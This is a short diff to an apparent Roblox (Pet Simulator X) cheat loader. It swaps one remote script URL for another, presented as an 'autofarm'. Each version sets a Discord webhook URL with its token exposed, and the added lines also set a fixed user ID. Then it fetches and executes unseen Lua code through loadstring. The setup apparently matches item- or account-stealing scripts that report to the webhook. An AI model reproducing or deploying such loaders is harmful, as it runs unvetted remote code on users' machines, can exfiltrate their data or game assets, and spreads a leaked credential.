@@ -1,3 +1,3 @@
-_G.Key = "(2ggudff)"
-_G.AuthServer = "(https://discord.com/api/webhooks/1057653019048681552/T9zmvaYiZRY9gOFNGzF2DP7UXKdnxLkqi2TI9I3Zxk2f0o2AquSUQLaMJIJ-Uwsh9f4K)"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
+_G.UserID = 1327140362
+_G.WebHook = "https://discord.com/api/webhooks/1057653019048681552/T9zmvaYiZRY9gOFNGzF2DP7UXKdnxLkqi2TI9I3Zxk2f0o2AquSUQLaMJIJ-Uwsh9f4K"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/PsxScripts.Lua/main/PsxAutofarm.true"))()
